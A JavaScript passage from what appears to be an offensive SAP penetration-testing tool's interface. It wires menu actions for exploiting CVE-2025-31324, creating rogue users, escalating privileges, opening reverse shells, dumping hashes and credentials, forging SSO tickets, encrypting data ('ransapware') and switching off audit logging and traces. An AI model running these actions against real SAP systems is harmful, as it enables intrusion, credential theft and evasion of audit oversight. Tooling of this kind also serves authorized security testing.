  const hasJavaUmeUser = (n.created_users || []).some(u => (u.method || '').toLowerCase().indexOf('java') === 0);
  if (hasGw && !pwned && isAbap && !isJava)
    suggestions.push({icon: '⚡', label: 'Create User via GW', action: 'create_user_gw'});
  if (hasMs && !pwned)
    suggestions.push({icon: '⚡', label: 'Betrusted Chain', action: 'create_user_betrusted'});
  if (hasCve31324 && !pwned)
    suggestions.push({icon: '⚡', label: 'Exploit CVE-2025-31324', action: 'exploit_cve_31324_drop'});
  if (isJava && (hasCve31324 || hasCve6287 || hasGw) && !hasJavaUmeUser)
    suggestions.push({icon: '👤', label: 'Create User (Java UME)', action: 'create_user_java'});
  if ((hasVerified || created.length > 0) && !pwned && isAbap)
    suggestions.push({icon: '🔓', label: 'Privilege Escalation', action: 'lpe'});
  if (linuxLpeViable && pwned)
    suggestions.push({icon: '🐧', label: 'Escalate to Root', action: 'exploit_linux_lpe'});
  if (winLpeViable && pwned)
    suggestions.push({icon: '🪟', label: 'Escalate to SYSTEM', action: 'exploit_windows_lpe'});

  // Phase 3: Post-Exploitation
  const hasSomeTested = (mapState.connections || []).some(c => c.source_sid === sid && c.tested);
  if (isAbap && hasUsableAbap && !hasSomeTested)
    suggestions.push({icon: '🔗', label: 'Retrieve RFC Destinations', action: 'retrieve_rfcs'});
  if (hasRFCs && hasUntested && hasSomeTested)
    suggestions.push({icon: '🧪', label: 'Test RFC Connections', action: 'test_rfcs'});
  if (hasRFCs && hasTestedReachable)
    suggestions.push({icon: '🌐', label: 'Propagate to Reachable', action: 'propagate'});
  if (hasUsableAbap && !(n.secstore_entries || []).length)
    suggestions.push({icon: '🔐', label: 'Download Hashes', action: 'download_hashes'});
  if (isJava && (hasCve31324 || hasGw) && !n.java_secstore_checked)
    suggestions.push({icon: '🔐', label: 'Extract Java Hashes', action: 'download_hashes'});
  if (isJava && (hasCve31324 || hasGw || (n.created_users || []).some(u => (u.method||'').toLowerCase().indexOf('java') === 0)))
    if (!(mapState.connections || []).some(c => c.source_sid === sid && c.is_btp_dest !== undefined))
      suggestions.push({icon: '📡', label: 'Read Java Destinations', action: 'read_java_destinations'});

  // Phase 4: BTP
  if (hasUsableAbap && !Object.keys(mapState.btp_subaccounts || {}).length)
    suggestions.push({icon: '☁', label: 'Harvest BTP Credentials', action: 'harvest_btp_creds'});

  // Phase 5: SCC on same host — if the SAP node is pwned (or has OS-exec
  // via GW/CVE-31324/created-users) and an SCC lives on the same IP,
  // suggest harvesting its mappings.  Only surface when no SCC creds have
  // been captured yet — otherwise the operator should go work on the SCC
  // directly (via the SCC context menu's own Suggested Next).
  if (_hasSccOnSameHost(n) && (hasOsExec || pwned)) {
    const sccHost = _sccHostForNode(n);
    const sn = sccHost ? (mapState.scc_nodes || {})[sccHost] : null;
    const sccHasCreds = sn && (sn.credentials || []).length > 0;
    if (!sccHasCreds)
      suggestions.push({icon: '☁', label: 'Harvest SCC Mappings', action: 'harvest_scc_mappings'});
  }

  // Phase 7: Reporting — once we've pwned this node, offer to export the
  // engagement report.  Simple gate: don't spam it before there's a story
  // to report.  Only counts nodes with created_users so a passively
  // "gw_vulnerable" node without action doesn't trigger it.
  if (pwned && created.length > 0) {
    const totalPwned = Object.values(mapState.nodes || {})
      .filter(nn => nn.pwned).length;
    if (totalPwned >= 1)
      suggestions.push({icon: '📝', label: 'Export Engagement Report', action: 'export_report'});
  }

  return suggestions.slice(0, 3);
}

function showCtxMenu(e, sid) {
  e.preventDefault();
  e.stopPropagation();
  hideMapCtxMenu();
  hideSCCCtxMenu();
  hideBTPCtxMenu();
  hideTMSCtxMenu();
  hideDBCONCtxMenu();
  selectedNodeSid = sid;
  const n = (mapState.nodes || {})[sid];
  const menu = document.getElementById('ctx-menu');

  // Determine node capabilities
  const hasCreds = n && ((n.credentials || []).length > 0 || (n.created_users || []).length > 0 || n.pwned);
  // Strict: a credential we KNOW works.  Required by every ABAP
  // data-extraction action (retrieve_rfcs / download_hashes /
  // download_secstore / download_table / client_roles /
  // analyse_capabilities / impact_assess / create_tcpip).
  // node.pwned alone (e.g. GW-vuln before user-creation) is not
  // enough — the BAPI / RFC_READ_TABLE calls need an actual logon.
  const hasVerifiedCred = !!(n &&
    (n.credentials || []).some(c => c && c.verified));
  const hasGwVuln = n && n.gw_vulnerable;
  const hasMsVuln = n && n.ms_vulnerable;
  const hasMsPort = n && n.ms_port > 0;
  const sysType = (n && typeof n.system_type === 'string') ? n.system_type.toUpperCase() : '';
  const isJavaStack = sysType.indexOf('JAVA') !== -1;
  const isAbapStack = sysType.indexOf('ABAP') !== -1;
  const isSaprouter = sysType.indexOf('SAPROUTER') !== -1;
  // Strict "dedicated Web Dispatcher" check.  We can't use
  // n.is_web_dispatcher here — that flag goes True for ANY node
  // whose ICM port fingerprints as a WD, including Java NW
  // dispatchers (the underlying sapwd/sapwebdisp binary is shared).
  // The user-facing classification is system_type, so use it
  // directly: only system_type === 'WEB_DISPATCHER' counts as
  // "a dedicated WD where /sap/wdisp/admin makes sense".
  const isWebDispatcher = sysType === 'WEB_DISPATCHER';
  const isWindows = n && (n.os_type || '').toLowerCase().includes('windows');
  const hasCve31324 = n && n.cve_2025_31324_vulnerable;
  const hasSshAccess = n && (n.ssh_access || []).length > 0;
  // SAPControl OSExecute pivot — any INCOMING Type-G connection from
  // another node whose credentials we've verified against SAPControl
  // gives us OS shell as <sid>adm on this target.  Same class of
  // access as GW SAPXPG / CVE-31324 shell — enables OS Command
  // Terminal, Reverse Shell, and downstream OS actions.  Read once
  // here so every consumer below stays consistent.
  const hasSapControlOsExec = n && (mapState.connections || []).some(
    c => c && c.target_sid === sid
       && c.os_exec_verified === true);
  const hasCve6287  = n && n.cve_2020_6287_vulnerable;
  const hasGwPort = n && (n.instances || []).some(i => Object.entries(i.ports || {}).some(([p,s]) => s === 'gateway' || (p >= 3300 && p <= 3399)));
  const hasFindings = n && (n.findings || []).length > 0;
  const hasCreatedUsers = n && (n.created_users || []).length > 0;
  // A Java admin user (from RECON or CVE-31324) unlocks the CTC / telnet
  // deploy paths for Java data extraction — but ONLY if at least one of
  // those primitives is reachable on the target.  java_deploy_blocked
  // is set by the backend after we have confirmed both are unavailable
  // (CTC ConfigServlet 404 + no telnet console reachable).  On a
  // hardened AS Java, RECON stays useful for user creation but data
  // extraction is greyed out with a tooltip explaining why.
  const hasJavaAdmin = isJavaStack && (n.created_users || []).some(u =>
    (u.method || '').toLowerCase().indexOf('java') === 0 && u.password);
  const javaDeployBlocked = !!(n && n.java_deploy_blocked);
  const hasJavaDeploy = hasJavaAdmin && !javaDeployBlocked;
  const hasRFCs = (mapState.connections || []).some(c => c.source_sid === sid);
  const hasUntested = (mapState.connections || []).some(c => c.source_sid === sid && !c.tested);
  // Composite: every ABAP RFC-driven data-extraction action gates
  // on this.  ABAP stack + (verified cred OR a SAPMAP-created user
  // — the latter implies its own working password).
  const hasUsableAbapAccess = isAbapStack
    && (hasVerifiedCred || hasCreatedUsers);

  // Enable/disable rules per action
  const rules = {
    'details':          true,                       // always available
    'findings':         true,                       // always (shows "no findings" if empty)
    'credentials':      true,                       // always available
    // Remove Credentials — only show when there's something to remove
    'remove_credentials': (n && (n.credentials || []).length > 0),
    'rfc_system_info':  hasGwPort,                   // need a gateway port
    'check_gw':         hasGwPort,                   // need a gateway port
    // Probes the message server internal port (39NN) for CVE-2020-6207
    // ACL bypass.  A standalone Web Dispatcher has no message server
    // and no 39NN — disable for pure-WD nodes (still allowed when the
    // host runs ABAP/Java alongside the WD).
    'check_ms':         isAbapStack || isJavaStack,
    'check_cve_31324':       isJavaStack,             // Java-only vulnerability
    'check_cve_6287':        isJavaStack,             // Java-only RECON check
    'check_cve_22536':       isAbapStack || isJavaStack || !!n.is_web_dispatcher,
    'wd_rediscover':         isWebDispatcher,
    'wd_admin_creds':        isWebDispatcher,
    'wd_admin_probe_defaults': isWebDispatcher,
    'wd_extract_icmauth':    isWebDispatcher,
    'exploit_cve_31324_drop': hasCve31324,            // need confirmed CVE-2025-31324
    'icmad_acl_bypass':      !!n.cve_2022_22536_port, // need confirmed ICMAD port (live or patch-table)
    'icmad_heapdump_pull':   !!(n.cve_2022_22536_acl_bypass
                                  && n.cve_2022_22536_acl_bypass['/heapdump/']
                                  && n.cve_2022_22536_acl_bypass['/heapdump/'].via === 'smuggle'),
    'create_user_java':      isJavaStack && (hasCve31324 || hasCve6287 || hasGwVuln),
    'betrusted':             hasMsPort,              // need a known MS port
    'create_user_betrusted': hasMsVuln || hasGwVuln, // need vulnerable MS or GW
    'create_user_gw':   hasGwVuln,                  // need GW vulnerability
    'create_user_dpmon_sapstar': hasGwVuln && isAbapStack && n.dpmon_sap_star_available,  // kernel>=790 + ABAP + GW
    // Transport import needs an OS-exec channel on the target.  Two
    // primitives are wired in:
    //   * GW SAPXPG (10KBLAZE) — unauthenticated, requires gw_vulnerable
    //   * SXPG_STEP_XPG_START — authenticated, requires a SAP_ALL cred
    //     (SAPMAP-created user or operator-supplied verified cred)
    // Transports themselves are an ABAP-stack construct — a pure-Java
    // target won't have /usr/sap/trans/ or tp at all.
    'import_transport':  isAbapStack && (hasGwVuln || hasCreds) && !hasSshAccess,
    // TMS-lateral propagation: needs an ABAP source that already has
    // materialised TMS destinations (Bundle 1 probe run and at least
    // one destination with logon_ok).  Post-check for logon_ok lives
    // in the orchestrator — the menu gate just checks presence.
    'tms_propagate': isAbapStack && (hasGwVuln || hasCreds)
                       && !hasSshAccess
                       && !!(n && (n.tms_destinations || []).length > 0),
    'create_user_creds': hasCreds && !hasSshAccess,
    'lpe':              isAbapStack && hasCreds && !hasSshAccess,
    'check_linux_lpe':   !isWindows && (hasGwVuln || hasCve31324 || hasCreatedUsers || hasCreds),
    'exploit_linux_lpe': !isWindows && (hasGwVuln || hasCve31324 || hasCreatedUsers || hasCreds),
    'check_windows_lpe':   isWindows && (hasGwVuln || hasCve31324 || hasCreatedUsers || hasCreds),
    'exploit_windows_lpe': isWindows && (hasGwVuln || hasCve31324 || hasCreatedUsers || hasCreds),
    'deep_scan':        true,                       // always available
    // Standard Scan runs the discovery sweep against the node's
    // host + IP.  Two modes, chosen automatically by the backend:
    //   * Placeholder (BTP / WD / RFC-G materialised) → PROMOTE:
    //     replace with freshly-fingerprinted node, re-point edges,
    //     carry over credentials and findings.
    //   * Real node (already fingerprinted, may carry credentials +
    //     findings + CVE flags) → RESCAN: MERGE newly-found ports
    //     and instances into the existing node without touching
    //     the enrichment.  Used e.g. when SJJ came in via a Type-G
    //     SAPControl destination with only :50200 recorded and the
    //     operator needs the gateway port (3302) discovered so
    //     Check GW Vulnerability can run.
    // Only requirement: a host / IP to sweep.
    'standard_scan':    !!(n && (n.hostname || n.ip)),
    // ABAP-only AND needs a real credential (verified RFC login or
    // a SAPMAP-created user) — the analyser reads AGR_USERS / UST04
    // via RFC; node.pwned alone (e.g. pwned via GW exploit without
    // a user created yet) doesn't give us a way to call those reads.
    'analyse_capabilities': isAbapStack && (
        (n && (n.credentials || []).some(c => c && c.verified))
        || hasCreatedUsers),
    // Sits behind --allow-evasion like every other Evasion-submenu entry
    // for UX consistency — the operator opts in to the evasion workflow
    // at startup, then everything under the ninja icon becomes available.
    // The probe itself is pure-read (no target state changes) but it's
    // still an evasion-workflow step, not a discovery step.
    'probe_telemetry':  hasUsableAbapAccess
        && !!(mapState.evasion && mapState.evasion.allow_evasion),
    'capture_evasion_baseline': hasUsableAbapAccess
        && !!(mapState.evasion && mapState.evasion.allow_evasion),
    'probe_rsau_api': hasUsableAbapAccess
        && !!(mapState.evasion && mapState.evasion.allow_evasion),
    'probe_rsau_dyn_profile': hasUsableAbapAccess
        && !!(mapState.evasion && mapState.evasion.allow_evasion),
    'tier3_sal_slot_disable': hasUsableAbapAccess
        && !!(mapState.evasion && mapState.evasion.allow_evasion)
        && !!(mapState.evasion && mapState.evasion.baseline_captured_at),
    'tier3_gw_logging_off': hasUsableAbapAccess
        && !!(mapState.evasion && mapState.evasion.allow_evasion)
        && !!(mapState.evasion && mapState.evasion.baseline_captured_at),
    'tier3_rdisp_trace_off': hasUsableAbapAccess
        && !!(mapState.evasion && mapState.evasion.allow_evasion)
        && !!(mapState.evasion && mapState.evasion.baseline_captured_at),
    'tier3_sal_uname_narrow': hasUsableAbapAccess
        && !!(mapState.evasion && mapState.evasion.allow_evasion)
        && !!(mapState.evasion && mapState.evasion.baseline_captured_at),
    'tier3_java_sal_suppress': isJavaStack
        && (hasCve31324 || hasGwVuln || hasJavaDeploy)
        && !!(mapState.evasion && mapState.evasion.allow_evasion),
    'tier3_dbtablog_purge': hasUsableAbapAccess
        && !!(mapState.evasion && mapState.evasion.allow_evasion),
    // Virtual SAP Death Star — Linux-only (Julian Petersohn's C hook
    // uses process_vm_readv + PTRACE_ATTACH + /proc/<pid>/exe).
    // Needs an OS-exec channel to upload + compile + launch the hook
    // as <sid>adm.  Unlike sibling Tier 3 mutations, Death Star does
    // NOT require a captured baseline — the C hook only mutates live
    // INT3 bytes in disp+work, which its own SIGTERM handler restores
    // via detach_all(); nothing that a baseline snapshot (rsau params,
    // SAL slot definitions) would help restore.  The tier3 entry
    // itself already passes ``require_baseline=False`` — mirror that
    // relaxation in the GUI so the operator can arm right after
    // --allow-evasion without a baseline detour.
    'tier3_sal_death_star_launch': !isWindows
        && (hasGwVuln || hasCve31324 || hasCreatedUsers || hasSapControlOsExec)
        && !!(mapState.evasion && mapState.evasion.allow_evasion)
        // Don't offer Arm when a hook is already running on this node.
        // Prevents accidental double-arm which would kill the running
        // hook and re-plant INT3s — unnecessary churn on live disp+work.
        && !(n && n.death_star_hook_pid > 0),
    // Disarm is only meaningful when a hook is actually armed.  Gate
    // on ``death_star_hook_pid > 0`` (set by tier3_sal_death_star_launch
    // after a successful arm, cleared by tier3_sal_death_star_stop
    // after a clean disarm).  Prevents the "click Disarm on a node
    // that was never armed" flow from firing a pointless SIGTERM cycle.
    'tier3_sal_death_star_stop': !isWindows
        && !!(mapState.evasion && mapState.evasion.allow_evasion)
        && !!(n && n.death_star_hook_pid > 0),
    'retrieve_rfcs':    hasUsableAbapAccess,        // ABAP-only RFC + BAPI
    'test_rfcs':        hasUsableAbapAccess && hasRFCs,
    'read_java_destinations': isJavaStack && (hasCve31324 || hasGwVuln || hasJavaDeploy),
    // ABAP path uses RFC BAPIs (SAP_ALL user or gateway); Java path
    // needs a JSP-deploy primitive. A RECON UME user alone with no
    // reachable CTC/telnet cannot extract hashes/tables, so gate the
    // Java branch on hasJavaDeploy rather than hasJavaAdmin.
    'download_hashes':    hasUsableAbapAccess ||
                          (isJavaStack && (hasCve31324 || hasGwVuln || hasJavaDeploy || hasSapControlOsExec)),
    'download_secstore':  hasUsableAbapAccess,        // RSECTAB is ABAP
    // Read TMS domain — same auth requirement as SecStore (ABAP
    // access needed for TMSCSYS + TMSMCONF).  Extra gate: at least
    // one /RFC/TMSADM@... in the already-dumped SecStore.
    'tms_discover':       hasUsableAbapAccess &&
                          (n && (n.secstore_entries || []).some(e =>
                            (e.ident_clean || e.ident || '').indexOf('TMSADM@') !== -1)),
    // Java SecStore extraction reads three files off the OS
    // filesystem ($SAPGLOBAL/security/data/SecStore.{properties,key}
    // + the encrypted contents).  Any OS-exec path lets us do that
    // — including the SAPControl OSExecute channel unlocked by a
    // verified Type-G destination on this target.
    'download_java_secstore': isJavaStack && (hasCve31324 || hasGwVuln || hasJavaDeploy || hasSapControlOsExec),
    'view_java_secstore':     n && n.java_secstore_checked,
    'download_table':     hasUsableAbapAccess ||
                          (isJavaStack && (hasCve31324 || hasGwVuln || hasJavaDeploy || hasSapControlOsExec)),
    // ABAP-only AND needs a real credential (verified RFC login or
    // a SAPMAP-created user).  node.pwned alone isn't enough — the
    // BAPI / RFC_READ_TABLE calls behind the impact scenarios fail
    // without a working logon.
    'impact_assess':      isAbapStack && (
        (n && (n.credentials || []).some(c => c && c.verified))
        || hasCreatedUsers),
    'impact_view':        (n.impact_results||[]).length > 0,
    'impact_assess_java': isJavaStack && (hasCve31324 || hasGwVuln || hasJavaDeploy),
    // Three OS-exec paths:
    //   - GW SAPXPG: works on ANY SAP gateway (ABAP or Java), regardless
    //     of stack — SAPMAP's own probe confirms by running `whoami` as
    //     <sid>adm. So hasGwVuln enables terminal regardless of stack.
    //   - ABAP SXPG: requires an ABAP dialog/RFC user with SAP_ALL.
    //   - CVE-2025-31324 webshell: Java only, unauth.
    'os_terminal':      hasGwVuln || (isAbapStack && hasCreatedUsers) || hasCve31324 || hasSshAccess || hasSapControlOsExec,
    'file_browser':     hasGwVuln || (isAbapStack && hasCreatedUsers) || hasCve31324 || hasSshAccess || hasSapControlOsExec,
    'reverse_shell':    hasGwVuln || (isAbapStack && hasCreatedUsers) || hasCve31324 || hasSshAccess || hasSapControlOsExec,
    'ssh_harvest':      !isWindows && (hasGwVuln || hasCve31324 || hasCreatedUsers),
    'ssh_harvest_root': !isWindows && (hasGwVuln || hasCve31324 || hasCreatedUsers)
                          && !!(n && (n.copyfail_root_obtained || n.dirtyfrag_root_obtained
                                       || n.peditcow_root_obtained
                                       || n.copyfail_vulnerable || n.dirtyfrag_vulnerable
                                       || n.peditcow_vulnerable)),
    'ssh_test_keys':    !isWindows && (hasGwVuln || hasCve31324 || hasCreatedUsers),
    'harvest_scc':          hasGwVuln || hasCve31324 || hasCreatedUsers,
    // LPE-escalating SCC hash dump — needs OS-exec channel AND a
    // viable Linux LPE (copyfail / peditcow / dirtyfrag).  Windows
    // targets are disabled because all three techniques are Linux-only.
    'harvest_scc_hashes_via_lpe': !isWindows
        && (hasGwVuln || hasCve31324 || hasCreatedUsers)
        && (!!n && (n.copyfail_vulnerable || n.dirtyfrag_vulnerable
                      || n.peditcow_vulnerable
                      || n.copyfail_root_obtained
                      || n.dirtyfrag_root_obtained
                      || n.peditcow_root_obtained)),
    'harvest_scc_mappings': hasGwVuln || hasCve31324 || hasCreatedUsers,
    'harvest_scc_ssfs':     hasGwVuln || hasCve31324 || hasCreatedUsers,
    'scc_via_sap_set_credentials':  true,
    'scc_via_sap_probe_creds':      true,
    'scc_via_sap_pull_mappings':    true,
    'scc_via_sap_probe_mappings':   true,
    'scc_via_sap_extract_keystore': true,
    'scc_via_sap_download_hashes':  hasGwVuln || hasCve31324 || hasCreatedUsers,
    // ABAP-only — Type-T destination + RFC_DESTINATION_INSERT need a
    // working ABAP logon.  Same verified-cred / created-user gate as
    // the other RFC-driven actions.
    'create_tcpip':     isAbapStack && (
        (n && (n.credentials || []).some(c => c && c.verified))
        || hasCreatedUsers),
    'propagate':        hasCreds,                   // need access to propagate from
    // MYSAPSSO2 ticket-forgery workflow.  Both actions are
    // ABAP-only because they pivot through SAPSYS.pse — Java
    // stacks don't have SAPSYS.pse and their SSO uses SNC instead
    // of MYSAPSSO2 cookies for the Diag path.
    //
    //   * forge_ticket — needs OS-level read access on the issuing
    //     AS to reach SAPSYS.pse + cred_v2.  Three orthogonal
    //     paths qualify: vulnerable RFC Gateway (hasGwVuln),
    //     CVE-2025-31324 JSP webshell (hasCve31324), or an
    //     existing SAPMAP-created OS user (isAbapStack &&
    //     hasCreatedUsers).  RFC alone is NOT enough because no
    //     RFC function returns the raw PSE contents.
    //
    //   * propagate_ticket — needs BOTH a ForgedTicket on the
    //     node AND a SAPMAP-created user.  The created user
    //     provides the ABAP credential for RFC FM ICM_GET_INFO,
    //     which discovers the target's actual ICM HTTP/HTTPS
    //     ports (replacing all port-guessing).  Hidden until
    //     both prerequisites are met.
    //
    // The SSO2 profile pre-flight check used to live here too as
    // ``sso2_profile_check`` — it now runs implicitly as step 2.5
    // inside the forge orchestrator (uses RFC
    // PFL_GET_SINGLE_PARAMETER when creds are available, falls
    // back to profile-file read via sapxpg).  The standalone
    // surface was removed as duplicative.  Operators wanting an
    // isolated check should use ``tools/check_sso2_profile.py``.
    'forge_ticket':       isAbapStack && (hasGwVuln
                            || hasCve31324
                            || hasCreatedUsers),
    'propagate_ticket':   (n.forged_tickets || []).length > 0 && hasCreatedUsers,
    'discover_strustsso2': isAbapStack && hasCreatedUsers,
    'forge_and_fanout':   isAbapStack && (hasGwVuln
                            || hasCve31324
                            || hasCreatedUsers),
    // Harvest BTP credentials — ABAP-only, needs a working RFC
    // logon.  The backend handler reads three ABAP-specific state
    // sources to find BTP-pointing credentials:
    //   * OA2C OAuth profiles  — backend reads on-the-fly via the
    //     OA2C_CLIENT[_EXT] RFC tables (ABAP-only feature)
    //   * RSECTAB secstore entries — backend reads RSECTAB via
    //     RFC_READ_TABLE; populated by Download SecStore
    //   * RFC destinations     — node's connection list filtered
    //     to *.hana.ondemand.com; populated by Retrieve RFC
    //     Connections
    // Earlier gate said ``isAbapStack || isJavaStack``, but the
    // Java path was a red herring: Java SecStore has no native BTP
    // OAuth client storage equivalent to OA2C, and the harvest
    // returned zero candidates on every Java node we tested.
    // Tighten to ABAP + a usable RFC credential to match the
    // canonical analyse_capabilities / retrieve_rfcs gate.
    'harvest_btp_creds': hasUsableAbapAccess,
    'ransapware_encrypt': hasUsableAbapAccess,
    'ransapware_decrypt': hasUsableAbapAccess,
    'cleanup':          hasCreatedUsers,             // need created users to clean up
    'client_roles':     hasUsableAbapAccess,        // ABAP-only RFC reads
    'read_usrextid':    hasUsableAbapAccess,        // ABAP-only RFC reads
    // PP impersonation verification — needs all of:
    //   1. node has a linked SCC,
    //   2. that SCC has a PP analysis (rule parsed),
    //   3. PP rule is exploitable (not BLOCKED),
    //   4. at least one BTP token is in process memory.
    'verify_pp_impersonation': (() => {
      const links = n.scc_links || [];
      if (!links.length) return false;
      const sccs = mapState.scc_nodes || {};
      const exp = (n.pp_impersonation || {}).exploitability || '';
      const hasViableRule = links.some(h => {
        const sn = sccs[h];
        if (!sn) return false;
        const ppa = sn.pp_analysis || {};
        return !!ppa.pp_config;
      });
      const hasToken = !!(mapState.btp_token_regions || []).length;
      return hasViableRule && hasToken && exp !== 'blocked';
    })(),
    'set_type':         true,                       // always available
    'set_sid':          true,                       // always available
    'set_db_type':      true,                       // always available
    'set_os_type':      true,                       // always available
    'set_instance_nr':  true,                       // always available
    'enum_clients':     true,                       // always (uses DIAG, no creds needed)
    'default_creds':    true,                       // always (uses DIAG, no creds needed)
    'check_router_info': true,                     // always (direct TCP, no creds)
    'router_scan':      true,                       // always (probes via SAProuter, no creds)
    'set_saprouter':    true,                       // always available
    'set_telnet_override': isJavaStack,              // only meaningful for Java stacks
    'delete_system':    true,                       // always available
  };

  // Tooltip hints for disabled items
  const hints = {
    'rfc_system_info':  'No gateway port detected',
    'check_gw':         'No gateway port detected',
    'betrusted':             'Run Check MS Betrusted first to find the MS port',
    'create_user_betrusted': 'Requires a vulnerable MS (betrusted) or gateway',
    'check_cve_31324':       'Only applicable to Java / double-stack systems',
    'check_cve_6287':        'Only applicable to Java / double-stack systems',
    'check_cve_22536':       'Only applicable to ICM-fronted nodes (ABAP / Java / Web Dispatcher)',
    'wd_rediscover':         'Only applicable to confirmed Web Dispatcher nodes',
    'wd_admin_creds':        'Only applicable to confirmed Web Dispatcher nodes',
    'wd_admin_probe_defaults': 'Only applicable to confirmed Web Dispatcher nodes',
    'wd_extract_icmauth':    'Only applicable to confirmed Web Dispatcher nodes',
    'check_ms':              'Probes the message server internal port (39NN) — not applicable to standalone Web Dispatchers',
    'harvest_btp_creds':     (!isAbapStack
        ? 'Harvest BTP Credentials is ABAP-only — the backend reads OA2C_CLIENT[_EXT] (OAuth profiles) and RSECTAB via RFC, both ABAP DDIC tables.  Java SecStore has no native BTP OAuth client equivalent.'
        : 'Needs a verified RFC credential or a SAPMAP-created user — RFC_READ_TABLE on OA2C / RSECTAB needs a working ABAP logon.  Run Standard Scan + Provide Credentials, or create a user via the GW / 10KBLAZE / dpmon chains first.'),
    'exploit_cve_31324_drop': 'Run Check CVE-2025-31324 first; vulnerability required',
    'icmad_acl_bypass':       'Run Check CVE-2022-22536 first to discover a vulnerable ICM port',
    'icmad_heapdump_pull':    'Run ICMAD ACL Bypass Sweep first; /heapdump/ must bypass to enable HPROF pull',
    'create_user_java':      'Requires Java / dual-stack system AND a usable CVE-2025-31324, RECON, or GW SAPXPG vuln',
    'create_user_gw':   'Requires a vulnerable RFC Gateway',
    'import_transport': (hasSshAccess
        ? 'Not available on SSH-only pwned hosts — transport import requires direct ABAP/RFC access.'
        : !isAbapStack
        ? 'Transport import requires an ABAP stack — transports are an ABAP-only construct (no /usr/sap/trans/ on pure Java).'
        : 'Needs an OS-exec channel: either a vulnerable RFC Gateway (run "Check GW Vulnerabilities") or a SAP_ALL credential (provide a verified RFC user or create one via the GW / 10KBLAZE / dpmon chains first).'),
    'tms_propagate': (
        !isAbapStack
          ? 'TMS propagation runs from an ABAP source — the source system holds the transport buffer we forward from.'
        : !(n && (n.tms_destinations || []).length)
          ? 'No TMS destinations on this node — run Scanning → Discover TMS topology (or dump SecStore) first to materialise the domain peers.'
        : 'Needs an OS-exec channel on this source (GW-vuln or SAP_ALL cred) so the transport zip can be staged. Downstream targets are reached via TMS forward RFCs first, then per-target OS-exec as fallback.'),
    'create_user_creds': (hasSshAccess
        ? 'Not available on SSH-only pwned hosts — user creation requires direct ABAP/RFC access.'
        : 'Provide credentials first'),
    'lpe':              (hasSshAccess
        ? 'Not available on SSH-only pwned hosts — ABAP LPE requires direct ABAP/RFC access.'
        : 'Provide credentials first'),
    'check_linux_lpe':   'Requires OS-exec on Linux host',
    'exploit_linux_lpe': 'Requires OS-exec on Linux host — run Check first to confirm at least one technique (Copy Fail / pedit-COW / Dirty Frag) is viable',
    'check_windows_lpe':   'Requires OS-exec on a Windows host (GW SAPXPG, CVE-2025-31324 shell, or SAPMAP-created OS-user)',
    'exploit_windows_lpe': 'Requires OS-exec on Windows host — run Check first to confirm MiniPlasma is viable (Win10 1709+ / Server 2019+ with cldflt.sys + .NET 4.7.2+)',
    'probe_telemetry':
        ((mapState.evasion && mapState.evasion.allow_evasion)
         ? 'Needs a verified RFC credential or a SAPMAP-created user — reads runtime profile parameters via TH_GET_PARAMETER (lightweight kernel FM) plus RSAU_PERS for SAL slots. No ABAP install, no AUM/AUW events.'
         : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).'),
    'capture_evasion_baseline':
        ((mapState.evasion && mapState.evasion.allow_evasion)
         ? 'Needs a verified RFC credential — calls TH_GET_PARAMETER + RSAU_API_GET_AUDIT_CONFIG and writes loot/baseline/<SID>/baseline_<ts>.json. Pure read; no mutation. Unblocks the require_baseline gate on every Tier 3 technique for this node.'
         : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).'),
    'probe_rsau_api':
        ((mapState.evasion && mapState.evasion.allow_evasion)
         ? 'Needs a verified RFC credential — calls FUNCTION_EXISTS + RFC_GET_FUNCTION_INTERFACE for the RSAU_API_* family. Pure metadata read; no SAL config touched. Emits one finding per FM with its IMPORT/EXPORT/TABLES signature so we have ground truth before any Tier 3 write code runs.'
         : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).'),
    'probe_rsau_dyn_profile':
        ((mapState.evasion && mapState.evasion.allow_evasion)
         ? 'Needs a verified RFC credential — calls RSAU_API_GET_PROFILE(ID_NAME=$DYN$, ID_DYN_CONF=X) and dumps the verbatim ET_FILT / ET_FILTEX / ET_TEXT / ET_LOG rows to loot/baseline/<SID>/dyn_profile_<ts>.json. Pure read; no mutation. Tells us the actual RSAUPROF row field set on this kernel so the Phase 3 writer can construct IT_FILT correctly.'
         : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).'),
    'tier3_sal_slot_disable':
        ((mapState.evasion && mapState.evasion.allow_evasion && mapState.evasion.baseline_captured_at)
         ? 'MUTATES kernel state. Flips STATUS=X→\' \' on one SAL filter slot via RSAU_API_SET_PROFILE(ID_UPD_DYN_CNF=X, ID_SET_ACTIV=\' \') — dynamic in-memory only, no profile file write. Holds the slot disabled for N seconds (operator picks), then auto-restores the baseline ET_FILT/ET_FILTEX/ET_TEXT via the evasion_window context. Watch SM19 / RSAU_CONFIG during the hold to verify the slot is genuinely inactive on the server.'
         : ((mapState.evasion && mapState.evasion.allow_evasion)
            ? 'Tier 3 armed but no baseline captured yet — run "Capture Evasion Baseline" on this node first.'
            : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).')),
    'tier3_gw_logging_off':
        ((mapState.evasion && mapState.evasion.allow_evasion && mapState.evasion.baseline_captured_at)
         ? 'MUTATES kernel state. Calls TH_CHANGE_PARAMETER to flip gw/logging at runtime — shared memory only, no profile file write. Suppresses dev_rd / dev_ms gateway action logs for the session. Baseline value auto-restored on session exit.'
         : ((mapState.evasion && mapState.evasion.allow_evasion)
            ? 'Tier 3 armed but no baseline captured yet — run "Capture Evasion Baseline" on this node first.'
            : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).')),
    'tier3_rdisp_trace_off':
        ((mapState.evasion && mapState.evasion.allow_evasion && mapState.evasion.baseline_captured_at)
         ? 'MUTATES kernel state. Calls TH_CHANGE_PARAMETER to flip rdisp/TRACE at runtime — shared memory only, no profile file write. Stops dev_disp / dev_w* dispatcher and work-process trace writes. Baseline value auto-restored on session exit.'
         : ((mapState.evasion && mapState.evasion.allow_evasion)
            ? 'Tier 3 armed but no baseline captured yet — run "Capture Evasion Baseline" on this node first.'
            : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).')),
    'tier3_sal_uname_narrow':
        ((mapState.evasion && mapState.evasion.allow_evasion && mapState.evasion.baseline_captured_at)
